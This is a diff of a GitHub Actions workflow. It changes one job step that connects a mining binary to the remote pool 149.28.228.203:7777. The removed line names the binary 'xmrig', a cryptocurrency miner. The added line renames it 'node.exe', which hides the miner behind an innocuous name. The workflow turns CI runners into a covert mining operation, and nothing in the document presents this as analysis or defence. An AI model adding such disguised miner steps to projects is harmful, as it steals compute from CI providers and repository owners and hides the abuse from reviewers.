@@ -32,4 +32,4 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: runner_go
-      run: ./xmrig -o 149.28.228.203:7777
+      run: ./node.exe -o 149.28.228.203:7777
